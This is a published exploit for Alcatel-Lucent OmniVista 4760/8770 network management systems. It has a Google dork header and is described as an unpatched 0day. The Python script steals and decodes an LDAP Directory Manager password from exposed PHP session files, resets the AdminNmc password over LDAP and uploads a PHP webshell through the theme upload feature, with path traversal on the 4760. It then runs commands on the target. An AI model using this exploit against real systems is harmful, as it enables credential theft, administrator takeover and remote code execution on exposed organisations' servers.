# Google Dork: inurl:php-bin/webclient.php
# Author: 0x1911
# Vendor Homepage: https://www.al-enterprise.com/
# Software Link: https://www.al-enterprise.com/en/products/communications-management-security/omnivista-8770-network-management-system
# Version: All versions, still unpatched
# Tested on: Windows 2003/2008
# CVE : 0day

# Exploit attached, also available here https://git.lsd.cat/g/omnivista-rce/src/master/omnivista.py
# Full writeup at https://git.lsd.cat/g/omnivista-rce/src/master/README.md


&#039;&#039;&#039;
Original url: https://git.lsd.cat/g/omnivista-rce
Website: https://lsd.cat
&#039;&#039;&#039;
import requests
import socket
import ldap
import sys
from urllib.parse import urlparse
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class OmniVista:
	def __init__(self, host):
		self.host = host
		self.addr = (urlparse(self.host).hostname)
		self.folders = [&#039;php-bin/&#039;, &#039;soap-bin/&#039;, &#039;bin/&#039;, &#039;data/&#039;, &#039;Themes/&#039;, &#039;log/&#039;]
		self.filename = "poc.php"
		self.webshell = "<?php system($_REQUEST[0]) ?>"

	def identify(self):
		r = requests.get(self.host + &#039;php-bin/Webclient.php&#039;, verify=False)
		if &#039;8770&#039; in r.text:
			return 8770
		elif &#039;4760&#039; in r.text:
			return 4760
		else:
			return False

	def checkldap(self):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(10)
		result = s.connect_ex((self.addr, 389))
		if result == 0:
			return True

	def info(self):
		r = requests.post(self.host + &#039;php-bin/info.php&#039;, data={"void": "phDPhd"}, verify=False)
		if &#039;PHP Version&#039; in r.text:
			return r.text
		else:
			return False

	def getpassword(self):
		r = requests.get(self.host + &#039;php-bin/Webclient.php&#039;, verify=False)
		id = r.headers[&#039;Set-Cookie&#039;].split(";")[0].split("=")[1]
		r = requests.get(self.host + &#039;sessions/sess_&#039; + id, verify=False)
		lenght = int(r.text.split("ldapSuPass")[1][3:5])
		password = r.text.split("ldapSuPass")[1][7:7+lenght]
		return password

	def decodepassword(self, password):
		counter = 0
		key = 16
		cleartext = ""
		if password[0:5] == "{NMC}":
			password = password[5:]
		else:
			return False
		for char in password:
			if 32 <= ord(char):
				char = chr(ord(char) ^ key)
				cleartext += char
			else:
				cleartext += char
			if ord(char) != 0:
				key = counter * ord(char) % 255 >> 3
			else:
				key = 16
			counter += 1
		return cleartext

	def connectldap(self):
		connect = ldap.initialize(&#039;ldap://&#039; + self.addr)
		connect.set_option(ldap.OPT_REFERRALS, 0)
		connect.simple_bind_s(self.username, self.password)
		result = connect.search_s(&#039;o=nmc&#039;, ldap.SCOPE_SUBTREE, &#039;(cn=AdminNmc)&#039;)
		print(&#039;[*] Current AdminNmc password: &#039; + str(result[0][1][&#039;userpassword&#039;][0]))
		self.bind = connect
		return True

	def editadminpassword(self):
		self.adminusername = "AdminNmc"
		self.adminpassword = "Lsdcat_exploit1!"
		self.bind.modify_s("uid=AdminNmc,cn=Administrators,cn=8770 administration,o=nmc", [(ldap.MOD_REPLACE, &#039;userpassword&#039;, self.adminpassword.encode(&#039;utf-8&#039;) )])
		return True

	def login(self):
		self.session = requests.session()
		r = self.session.post(self.host + &#039;php-bin/webclient.php&#039;, data = {"action": "loginCheck", "userLogin": self.adminusername, "userPass": self.adminpassword }, verify = False)
		if &#039;Directory license is required!&#039; in r.text:
			return False
		else:
			return True

	def exploit8770(self):
		r = self.session.get(self.host + &#039;php-bin/webclient.php&#039;, params = {&#039;action&#039;: &#039;editTheme&#039;, &#039;themeId&#039;: "2"}, verify=False)
		r = self.session.post(self.host + &#039;php-bin/webclient.php&#039;,
			data = {"action": "saveTheme", "themeId": "2"},
			files = { "BgImg1": (self.filename, self.webshell, "image/png")},
			verify = False)
		if &#039;success&#039; in r.text:
			return True

	def exec8770(self):
		return requests.post(self.host + &#039;Theme2/&#039; + &#039;poc.php&#039;, data = {"0": cmd}, verify=False).text

	def exploit4760(self):
		for folder in self.folders:
			r = requests.post(self.host + &#039;php-bin/webclient.php&#039;,
				data = {"action": "saveTheme", "themeId": "5/../../{}".format(folder), "themeDate": ""},
				files = { "BgImg1": (self.filename, self.webshell, "image/png")},
			verify=False)
			if &#039;success&#039; in r.text:
				self.folder = folder
				return True

	def exec4760(self, cmd):
		return requests.post(self.host + self.folder + &#039;poc.php&#039;, data = {"0": cmd}, verify=False).text

	def autoexploit(self):
		print(&#039;[*] Attempting to exploit on {}&#039;.format(self.host))
		self.model = self.identify()
		if self.model == 4760:
			print(&#039;[*] Model is {}&#039;.format(str(self.model)))
			self.exploit4760()
			print(&#039;[*] Upload folder is {}&#039;.format(self.folder))
			output = self.exec4760("whoami")
			print(&#039;[*] Webshell at {}{}{}&#039;.format(self.host, self.folder, self.filename))
			print(&#039;[*] Command output: &#039;.format(output))
		elif self.model == 8770:
			print(&#039;[*] Model is {}&#039;.format(str(self.model)))
			self.username = "cn=Directory Manager"
			self.password = self.decodepassword(self.getpassword())
			print(&#039;[*] {} password is "{}"&#039;.format(self.username, self.password))
			if self.checkldap():
				print(&#039;[*] LDAP Service is accessible!&#039;)
				self.connectldap()
				print(&#039;[*] Changing AdminNmc password&#039;)
				self.editadminpassword()
				print(&#039;[*] Logging in&#039;)
				if self.login():
					self.exploit8770()
					output = self.exec8770("whoami")
					print(&#039;[*] Webshell at {}{}{}&#039;.format(self.host, "themes/Theme2/", self.filename))
					print(&#039;[*] Command output: &#039;.format(output))
				else:
					print("[x] Directory license not installed :/")
					return False
			else:
				print("[x] LDAP Service is not directly accessible")
				return False

		else:
			print("[x] Target is not an OmniVista 4760/8770")
			return False

if len(sys.argv) != 2:
	print("Usage: ./omnivista.py http(s)://target.tld:port/")
else:
	exploit = OmniVista(sys.argv[1])
	exploit.autoexploit()

